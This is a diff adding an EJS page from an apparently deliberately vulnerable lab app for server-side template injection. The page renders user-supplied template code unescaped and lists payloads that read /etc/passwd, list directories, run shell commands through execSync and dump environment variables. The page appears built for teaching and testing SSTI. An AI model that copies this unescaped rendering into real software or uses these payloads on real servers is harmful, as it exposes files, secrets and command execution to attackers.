@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced SSTI Vulnerability</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #3C1053 0%, #B51825 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        h1 {
+            color: #3C1053;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .warning {
+            background: #F2120C;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: bold;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #3C1053;
+            font-weight: bold;
+        }
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #918B83;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #3C1053;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #B51825;
+        }
+        .result {
+            background: #F2EFEB;
+            border: 2px solid #918B83;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
+            min-height: 100px;
+        }
+        .nav {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .nav a {
+            color: #3C1053;
+            text-decoration: none;
+            margin: 0 15px;
+            padding: 8px 16px;
+            border-radius: 5px;
+            background: #F2EFEB;
+            display: inline-block;
+        }
+        .nav a:hover {
+            background: #918B83;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Advanced SSTI Vulnerability</h1>
+        <div class="warning">
+            ⚠️ HIGHLY VULNERABLE: This endpoint allows advanced template injection with file operations!
+        </div>
+        
+        <div class="nav">
+            <a href="/">Home</a>
+            <a href="/ejs">EJS</a>
+            <a href="/handlebars">Handlebars</a>
+            <a href="/mustache">Mustache</a>
+            <a href="/nunjucks">Nunjucks</a>
+            <a href="/advanced">Advanced</a>
+            <a href="/safe">Safe Example</a>
+        </div>
+
+        <form method="GET">
+            <div class="form-group">
+                <label for="template">Advanced Template Code:</label>
+                <textarea id="template" name="template" rows="5" placeholder="Enter advanced template code..."><%= template %></textarea>
+            </div>
+            <button type="submit">Execute Advanced Template</button>
+        </form>
+
+        <div class="result">
+            <h3>Advanced Template Output:</h3>
+            <%- template %>
+        </div>
+
+        <div style="margin-top: 30px; padding: 20px; background: #F2EFEB; border-radius: 8px;">
+            <h3>💡 Advanced SSTI Payloads:</h3>
+            <ul>
+                <li><strong>File Reading:</strong> <code>&lt;%= global.process.mainModule.require('fs').readFileSync('/etc/passwd', 'utf8') %&gt;</code></li>
+                <li><strong>Directory Listing:</strong> <code>&lt;%= global.process.mainModule.require('fs').readdirSync('/') %&gt;</code></li>
+                <li><strong>Command Execution:</strong> <code>&lt;%= global.process.mainModule.require('child_process').execSync('ls -la') %&gt;</code></li>
+                <li><strong>Environment Variables:</strong> <code>&lt;%= global.process.env %&gt;</code></li>
+                <li><strong>System Information:</strong> <code>&lt;%= global.process.platform + ' ' + global.process.arch %&gt;</code></li>
+                <li><strong>Network Information:</strong> <code>&lt;%= global.process.mainModule.require('os').networkInterfaces() %&gt;</code></li>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
